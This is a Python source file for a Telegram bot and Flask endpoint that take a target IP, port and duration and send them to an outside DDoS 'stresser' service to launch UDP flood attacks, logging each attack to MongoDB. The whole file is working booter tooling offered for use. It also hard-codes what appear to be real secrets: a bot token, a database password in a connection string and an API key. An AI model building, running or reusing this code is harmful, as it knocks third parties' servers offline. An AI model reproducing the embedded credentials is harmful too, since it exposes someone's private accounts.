import asyncio
import logging
import threading
import os
import requests
from datetime import datetime, timezone
from flask import Flask, request, jsonify
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from pymongo import MongoClient

# --- CONFIGURATION ---
# Ye wahi details hain jo aapne di thi
BOT_TOKEN = "8749691844:AAGNM0JIB5nHhVgZo2TXpbew919WKSGbt1o"
MONGODB_URI = "mongodb+srv://manasdev314_db_user:Ravirao226008@sastadev.pa9pfjb.mongodb.net/?appName=Sastadev"
DATABASE_NAME = "sastadev"

# Stresser API Details (Jahan attack bhejna hai)
STRESSER_API_URL = "https://api.battle-destroyer.shop/api/attack" # Check if endpoint is /api/attack
STRESSER_API_KEY = "ak_e09b114844018935feffc"

ADMIN_IDS = [8787952549]

api_app = Flask(__name__)

# MongoDB Setup
client = MongoClient(MONGODB_URI)
db = client[DATABASE_NAME]
attacks_col = db.attacks

# --- HELPER: SEND ATTACK TO STRESSER ---
def call_stresser_api(target, port, duration):
    try:
        # Aapki API ke parameters ke hisaab se payload
        payload = {
            "api_key": STRESSER_API_KEY,
            "target": target,
            "port": port,
            "duration": duration,
            "methods": "UDP" # Example method, adjust as per your stresser API
        }
        
        # Stresser API ko request bhejna
        response = requests.get(STRESSER_API_URL, params=payload, timeout=10)
        return response.json()
    except Exception as e:
        return {"success": False, "error": str(e)}

# --- APP API (For your Dashboard) ---
@api_app.route('/api/launch', methods=['POST'])
def api_launch():
    data = request.json
    # Dashboard security check
    if request.headers.get("x-api-key") != STRESSER_API_KEY:
        return jsonify({"success": False, "error": "Unauthorized"}), 403

    target, port, duration = data.get('ip'), data.get('port'), data.get('duration')
    
    result = call_stresser_api(target, port, duration)
    
    if result.get("success") or response.status_code == 200:
        attacks_col.insert_one({
            "target": target, "port": port, "duration": duration,
            "source": "App Dashboard", "timestamp": datetime.now(timezone.utc)
        })
        return jsonify({"success": True}), 200
    else:
        return jsonify({"success": False, "error": "Stresser API Failed"}), 500

# --- TELEGRAM COMMANDS ---
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.message.reply_text("❌ No Access")

    if len(context.args) < 3:
        return await update.message.reply_text("Usage: /attack <ip> <port> <time>")

    ip, port, duration = context.args[0], context.args[1], context.args[2]
    
    await update.message.reply_text(f"⏳ Sending request to Stresser API...")
    
    # API Call
    result = call_stresser_api(ip, port, duration)
    
    print(f"🔥 [API LOG] Target: {ip}:{port} | Result: {result}")
    
    attacks_col.insert_one({
        "user_id": update.effective_user.id, "target": ip, "port": port, 
        "duration": duration, "source": "Telegram", "timestamp": datetime.now(timezone.utc)
    })
    
    await update.message.reply_text(f"🚀 **Stresser Response:**\n`{result}`")

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    api_app.run(host='0.0.0.0', port=port)

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("attack", attack_command))
    
    threading.Thread(target=run_flask, daemon=True).start()
    
    print("\n" + "="*50)
    print("🤖 BOT STARTED (API MODE)")
    print(f"🌐 Server IP: {requests.get('https://api.ipify.org').text}")
    print(f"🔗 Targeting: {STRESSER_API_URL}")
    print("✅ No binary needed. Using External API.")
    print("="*50 + "\n")
    
    application.run_polling()

if __name__ == '__main__':
    main()
